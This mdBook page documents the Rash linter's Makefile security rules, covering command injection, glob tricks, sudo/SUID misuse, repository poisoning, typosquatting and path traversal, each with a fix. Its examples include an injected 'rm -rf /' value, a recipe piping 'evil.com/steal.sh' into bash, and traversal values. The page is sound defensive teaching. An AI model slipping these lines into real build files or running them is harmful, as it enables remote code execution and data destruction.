<!DOCTYPE HTML>
<html lang="en" class="rust sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Makefile Security - The Rash Book - Shell Safety and Purification</title>


        <!-- Custom HTML head -->

        <meta name="description" content="A comprehensive guide to Rash: shell safety, purification, and linting">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "rust";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('rust')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">The Rash Book - Shell Safety and Purification</h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/paiml/bashrs" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                        <a href="https://github.com/paiml/bashrs/edit/main/book/src/makefile/security.md" title="Suggest an edit" aria-label="Suggest an edit">
                            <i id="git-edit-button" class="fa fa-edit"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="makefile-security"><a class="header" href="#makefile-security">Makefile Security</a></h1>
<p>Rash detects security vulnerabilities in Makefiles, including command injection, unsafe shell usage, and privilege escalation risks.</p>
<h2 id="security-rules"><a class="header" href="#security-rules">Security Rules</a></h2>
<h3 id="make003-command-injection-via-unquoted-variables"><a class="header" href="#make003-command-injection-via-unquoted-variables">MAKE003: Command Injection via Unquoted Variables</a></h3>
<p><strong>Risk</strong>: HIGH - Arbitrary command execution</p>
<p><strong>Problem</strong>: Unquoted variables in shell commands allow injection attacks.</p>
<pre><code class="language-makefile"># ❌ DANGEROUS: Command injection vulnerability
install:
	cp $(FILE) /usr/local/bin/  # Attacker: FILE="../../../etc/passwd; rm -rf /"
</code></pre>
<p><strong>Attack Vector</strong>:</p>
<pre><code class="language-bash">$ make FILE="../../../etc/passwd; rm -rf /" install
<span class="boring"> Executes: cp ../../../etc/passwd; rm -rf / /usr/local/bin/
</span></code></pre>
<p><strong>Solution</strong>: Always quote variables in shell commands.</p>
<pre><code class="language-makefile"># ✅ SAFE: Quoted variable prevents injection
install:
	cp "$(FILE)" /usr/local/bin/
</code></pre>
<p><strong>Detection</strong>:</p>
<pre><code class="language-bash">$ rash lint Makefile
MAKE003: Potential command injection
  --&gt; Makefile:2
   |
 2 |     cp $(FILE) /usr/local/bin/
   |        ^^^^^^^ unquoted variable in shell command
   |
   = help: Quote variable to prevent injection
   = fix: cp "$(FILE)" /usr/local/bin/
</code></pre>
<h3 id="make004-unsafe-shell-metacharacters"><a class="header" href="#make004-unsafe-shell-metacharacters">MAKE004: Unsafe Shell Metacharacters</a></h3>
<p><strong>Risk</strong>: MEDIUM - Unintended shell expansion</p>
<p><strong>Problem</strong>: Shell metacharacters (<code>*</code>, <code>?</code>, <code>[</code>, <code>]</code>) expand unexpectedly.</p>
<pre><code class="language-makefile"># ❌ RISKY: Glob expansion may surprise
clean:
	rm -f *.o  # What if there's a file named "-rf"?
</code></pre>
<p><strong>Attack Vector</strong>:</p>
<pre><code class="language-bash">$ touch -- "-rf"
$ make clean
<span class="boring"> Executes: rm -f -rf *.o
</span><span class="boring"> May delete more than intended!
</span></code></pre>
<p><strong>Solution</strong>: Use explicit file lists or find with -delete.</p>
<pre><code class="language-makefile"># ✅ SAFER: Explicit file list
OBJS := $(sort $(wildcard *.o))

clean:
	rm -f $(OBJS)
</code></pre>
<h3 id="make009-privilege-escalation-via-sudo"><a class="header" href="#make009-privilege-escalation-via-sudo">MAKE009: Privilege Escalation via sudo</a></h3>
<p><strong>Risk</strong>: CRITICAL - Root access abuse</p>
<p><strong>Problem</strong>: Makefiles running sudo without validation.</p>
<pre><code class="language-makefile"># ❌ DANGEROUS: Unrestricted sudo
install:
	sudo cp app /usr/local/bin/
	sudo chmod 4755 /usr/local/bin/app  # Sets SUID bit!
</code></pre>
<p><strong>Solution</strong>: Use install(1) or warn users about sudo.</p>
<pre><code class="language-makefile"># ✅ BETTER: Use install command
install:
	@if [ "$(shell id -u)" != "0" ]; then \
		echo "Error: Must run as root or with sudo"; \
		exit 1; \
	fi
	install -m 755 app /usr/local/bin/app
</code></pre>
<p><strong>Detection</strong>:</p>
<pre><code class="language-bash">$ rash lint Makefile
MAKE009: Unsafe sudo usage
  --&gt; Makefile:3
   |
 3 |     sudo chmod 4755 /usr/local/bin/app
   |     ^^^^ unrestricted sudo with dangerous permissions
   |
   = warning: SUID bit grants root privileges
   = help: Use install(1) or check permissions explicitly
</code></pre>
<h2 id="real-world-attack-scenarios"><a class="header" href="#real-world-attack-scenarios">Real-World Attack Scenarios</a></h2>
<h3 id="scenario-1-repository-poisoning"><a class="header" href="#scenario-1-repository-poisoning">Scenario 1: Repository Poisoning</a></h3>
<p><strong>Attack</strong>: Malicious Makefile in cloned repository</p>
<pre><code class="language-makefile"># Attacker's Makefile
.PHONY: all
all:
	@echo "Building project..."
	@curl -s https://evil.com/steal.sh | bash  # ❌ Backdoor
	gcc -o app main.c
</code></pre>
<p><strong>Defense</strong>:</p>
<pre><code class="language-bash"><span class="boring"> Always review Makefiles before running make
</span>$ rash lint Makefile
MAKE007: Suspicious network access in recipe
  --&gt; Makefile:4
   |
 4 |     @curl -s https://evil.com/steal.sh | bash
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ downloads and executes remote code
   |
   = error: Potential backdoor or data exfiltration
   = help: Review all network operations in build scripts
</code></pre>
<h3 id="scenario-2-dependency-confusion"><a class="header" href="#scenario-2-dependency-confusion">Scenario 2: Dependency Confusion</a></h3>
<p><strong>Attack</strong>: Typosquatting in shell commands</p>
<pre><code class="language-makefile"># ❌ Typo allows attacker to substitute malicious binary
build:
	nmp install  # Should be "npm", but PATH includes attacker's "nmp"
</code></pre>
<p><strong>Defense</strong>:</p>
<pre><code class="language-makefile"># ✅ Use absolute paths for critical tools
NPM := /usr/bin/npm

build:
	$(NPM) install
</code></pre>
<h3 id="scenario-3-path-traversal"><a class="header" href="#scenario-3-path-traversal">Scenario 3: Path Traversal</a></h3>
<p><strong>Attack</strong>: Writing files outside build directory</p>
<pre><code class="language-makefile"># ❌ DANGEROUS: Allows path traversal
OUTPUT_DIR := $(PREFIX)/output

install:
	cp build/* $(OUTPUT_DIR)/
	# Attacker: make PREFIX=../../../etc install
</code></pre>
<p><strong>Defense</strong>:</p>
<pre><code class="language-makefile"># ✅ SAFE: Validate PREFIX and use absolute paths
PREFIX ?= /usr/local
OUTPUT_DIR := $(realpath $(PREFIX))/output

install:
	@if [ -z "$(realpath $(PREFIX))" ]; then \
		echo "Error: Invalid PREFIX"; \
		exit 1; \
	fi
	cp build/* "$(OUTPUT_DIR)/"
</code></pre>
<h2 id="security-best-practices"><a class="header" href="#security-best-practices">Security Best Practices</a></h2>
<h3 id="1-principle-of-least-privilege"><a class="header" href="#1-principle-of-least-privilege">1. Principle of Least Privilege</a></h3>
<pre><code class="language-makefile"># ❌ BAD: Runs everything as root
.PHONY: all install
all:
	sudo make build  # Unnecessary root access

install:
	sudo cp app /usr/local/bin/
</code></pre>
<p><strong>Better</strong>:</p>
<pre><code class="language-makefile"># ✅ GOOD: Only elevate when necessary
.PHONY: all install
all:
	make build  # Build as regular user

install:
	@if [ "$(shell id -u)" != "0" ]; then \
		echo "Run: sudo make install"; \
		exit 1; \
	fi
	install -m 755 app /usr/local/bin/
</code></pre>
<h3 id="2-input-validation"><a class="header" href="#2-input-validation">2. Input Validation</a></h3>
<pre><code class="language-makefile"># ✅ Validate all user-provided variables
PREFIX ?= /usr/local

install:
	@if [ -z "$(PREFIX)" ] || echo "$(PREFIX)" | grep -q '\.\.' ; then \
		echo "Error: Invalid PREFIX"; \
		exit 1; \
	fi
	install -m 755 app "$(PREFIX)/bin/"
</code></pre>
<h3 id="3-avoid-eval-and-shell-expansion"><a class="header" href="#3-avoid-eval-and-shell-expansion">3. Avoid Eval and Shell Expansion</a></h3>
<pre><code class="language-makefile"># ❌ DANGEROUS: eval() equivalent
COMMAND := $(shell cat commands.txt)
run:
	$(COMMAND)  # Executes arbitrary commands from file
</code></pre>
<p><strong>Safer</strong>:</p>
<pre><code class="language-makefile"># ✅ Explicit command list
VALID_COMMANDS := build test clean

run:
	@if ! echo "$(VALID_COMMANDS)" | grep -qw "$(CMD)"; then \
		echo "Error: Unknown command $(CMD)"; \
		exit 1; \
	fi
	@$(CMD)
</code></pre>
<h3 id="4-secure-file-permissions"><a class="header" href="#4-secure-file-permissions">4. Secure File Permissions</a></h3>
<pre><code class="language-makefile"># ✅ Use appropriate permissions
install:
	install -m 755 app /usr/local/bin/app          # Executable, not writable
	install -m 644 app.conf /etc/app/app.conf      # Config, not executable
	install -m 600 app.key /etc/app/app.key        # Secret, owner-only
</code></pre>
<h2 id="security-checklist"><a class="header" href="#security-checklist">Security Checklist</a></h2>
<p>Before deploying a Makefile:</p>
<ul>
<li><input disabled="" type="checkbox"/>
✅ Run <code>rash lint Makefile</code> to detect vulnerabilities</li>
<li><input disabled="" type="checkbox"/>
✅ Quote all variables used in shell commands</li>
<li><input disabled="" type="checkbox"/>
✅ Validate user-provided inputs (PREFIX, DESTDIR, etc.)</li>
<li><input disabled="" type="checkbox"/>
✅ Use absolute paths for critical binaries</li>
<li><input disabled="" type="checkbox"/>
✅ Avoid running unnecessary commands as root</li>
<li><input disabled="" type="checkbox"/>
✅ Set minimal file permissions with install(1)</li>
<li><input disabled="" type="checkbox"/>
✅ Review all network operations (curl, wget, git clone)</li>
<li><input disabled="" type="checkbox"/>
✅ Check for path traversal vulnerabilities</li>
<li><input disabled="" type="checkbox"/>
✅ Avoid eval-like constructs</li>
<li><input disabled="" type="checkbox"/>
✅ Test with malicious inputs (fuzzing)</li>
</ul>
<h2 id="automated-security-scanning"><a class="header" href="#automated-security-scanning">Automated Security Scanning</a></h2>
<pre><code class="language-bash"><span class="boring"> Run security linter
</span>$ rash lint --security-only Makefile

<span class="boring"> CI/CD integration
</span><span class="boring"> .github/workflows/security.yml
</span>- name: Security Scan
  run: |
    cargo install bashrs
    rash lint --security-only Makefile
    if [ $? -ne 0 ]; then
      echo "Security vulnerabilities detected!"
      exit 1
    fi
</code></pre>
<h2 id="resources"><a class="header" href="#resources">Resources</a></h2>
<ul>
<li><a href="https://owasp.org/www-community/vulnerabilities/Build_Misconfiguration">OWASP Build Security</a></li>
<li><a href="https://www.gnu.org/software/make/manual/html_node/Security.html">GNU Make Security</a></li>
<li><a href="https://reproducible-builds.org/">Reproducible Builds</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78: OS Command Injection</a></li>
</ul>
<hr />
<p><strong>Remember</strong>: Makefiles execute arbitrary shell commands - treat them like executable code, not configuration files!</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../makefile/overview.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../makefile/best-practices.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../makefile/overview.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../makefile/best-practices.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>

        <script src="../ace.js"></script>
        <script src="../editor.js"></script>
        <script src="../mode-rust.js"></script>
        <script src="../theme-dawn.js"></script>
        <script src="../theme-tomorrow_night.js"></script>

        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
